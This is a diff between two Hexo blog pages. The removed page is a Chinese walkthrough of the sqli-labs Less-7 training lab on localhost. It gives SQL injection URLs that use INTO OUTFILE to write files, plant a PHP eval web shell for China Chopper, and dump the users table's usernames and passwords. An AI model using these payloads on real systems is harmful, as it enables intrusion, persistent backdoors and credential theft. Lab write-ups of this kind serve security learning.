@@ -5,19 +5,14 @@
   
 
   
-  <title>less-7 | Hexo</title>
+  <title>Tag: less-32 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="我们通过之前的常规的注入方法可以大致猜出这关是只要正确就会输出you are in，然后用sql注入中的导出文件来做，根据提示也就是让我们用mysql中的outfile函数。 这里有一处需要格外注意，用outfile函数后没有文件生成，可能是因为phpstudy的原因，可以在mysql中加上 ![](C:\Users\lenovo\Pictures\Saved Pictures\屏幕截图 less">
-<meta property="og:type" content="article">
-<meta property="og:title" content="less-7">
-<meta property="og:url" content="http://example.com/2020/12/09/less-7/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/tags/less-32/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="我们通过之前的常规的注入方法可以大致猜出这关是只要正确就会输出you are in，然后用sql注入中的导出文件来做，根据提示也就是让我们用mysql中的outfile函数。 这里有一处需要格外注意，用outfile函数后没有文件生成，可能是因为phpstudy的原因，可以在mysql中加上 ![](C:\Users\lenovo\Pictures\Saved Pictures\屏幕截图 less">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-12-09T14:44:08.000Z">
-<meta property="article:modified_time" content="2020-12-10T14:37:16.998Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="less-7解读">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
@@ -67,91 +62,40 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-less-7" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/12/09/less-7/" class="article-date">
-  <time datetime="2020-12-09T14:44:08.000Z" itemprop="datePublished">2020-12-09</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
+        <section id="main">
   
-    <h1 class="article-title" itemprop="name">
-      less-7
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2021" class="archive-year">2021</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      <a href="/2021/03/01/less-32/" class="archive-article-date">
+  <time datetime="2021-03-01T02:03:10.000Z" itemprop="datePublished">Mar 1</time>
+</a>
+      
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2021/03/01/less-32/">less-32</a>
     </h1>
   
 
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>我们通过之前的常规的注入方法可以大致猜出这关是只要正确就会输出you are in，然后用sql注入中的导出文件来做，根据提示也就是让我们用mysql中的outfile函数。</p>
-<p>这里有一处需要格外注意，用outfile函数后没有文件生成，可能是因为phpstudy的原因，可以在mysql中加上</p>
-<p>![](C:\Users\lenovo\Pictures\Saved Pictures\屏幕截图 less-7_LI.jpg)</p>
-<p>如图，加入语句后就应该可以生成文件了。</p>
-<p>然后我们就可以开始进行注入了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-7&#x2F;?id&#x3D;1%27)) union select 1,2,3 into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\test.txt&quot;--+</span><br></pre></td></tr></table></figure>
-
-<p>然后就会显示sql出错，但是可以在文件里看看有没有test.txt文件生成。</p>
-<p>注入语句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select.....into outfile &quot;地址&quot;</span><br></pre></td></tr></table></figure>
-
-<p>接下来我们可以用一句话木马来把网站和中国菜刀连接（中国菜刀的使用方法自行百度，我也不会。。。）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-7&#x2F;?id&#x3D;-1%27))%20union%20select%201,2,%27%3C?php%20@eval($_POST[%22mina%22])?%3E%27%20into%20outfile%20%22D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\test.php%22--+</span><br></pre></td></tr></table></figure>
-
-<p>用上述语句来注入一句话木马，再将中国菜刀与之连接。</p>
-<p>接下来只要按以前的注入方法来注入就好了，但后面的文件名要是新的。</p>
-<p>例如，查数据库：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-7&#x2F;?id&#x3D;1%27)) union select 1,database(),3 into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\aaa.php&quot;--+</span><br></pre></td></tr></table></figure>
-
-<p>再网站上查看或中国菜刀上看产生的aaa.php就好了。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-7&#x2F;?id&#x3D;1%27))%20union%20select%201,(select%20group_concat(table%20name)%20from%20information_schema.tables%20where%20table_schema&#x3D;%27security%27),3%20into%20outfile%20%22D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\bb.php%22--+</span><br></pre></td></tr></table></figure>
-
-<p>上面是查表的语句。，接下来查列：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-7&#x2F;?id&#x3D;1%27))%20union%20select%201,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;%27security%27),3%20into%20outfile%20%22D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\cc.php%22--+</span><br></pre></td></tr></table></figure>
-
-<p>爆数据：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-7&#x2F;?id&#x3D;1%27))%20union%20select%201,group_concat(id,0x3a,username,0x3a,password),3%20from%20users%20into%20outfile%20%22D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\ee.php%22--+</span><br></pre></td></tr></table></figure>
-
-<p>或者用中国菜刀连接后对文件进行修改，例如，将报错注入的语句给注释掉的双斜杠给去掉，然后用报错注入来结局，或着直接将反馈的语句加进去用第一关的方法来过。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/12/09/less-7/" data-id="ckiobsx1b00014guy5efh1kef" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/less-7%E8%A7%A3%E8%AF%BB/" rel="tag">less-7解读</a></li></ul>
-
-    </footer>
+    </header>
   </div>
-  
-    
-<nav id="article-nav">
-  
-    <a href="/2020/12/10/%E7%9F%A9%E9%98%B5%E6%8E%92%E5%BA%8F/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          矩阵排序
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2020/12/05/sqlilabs-less-5/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">sqlilabs less-5</div>
-    </a>
-  
-</nav>
-
-  
 </article>
+  
+  
+    </div></section>
+  
+
 
 </section>
         
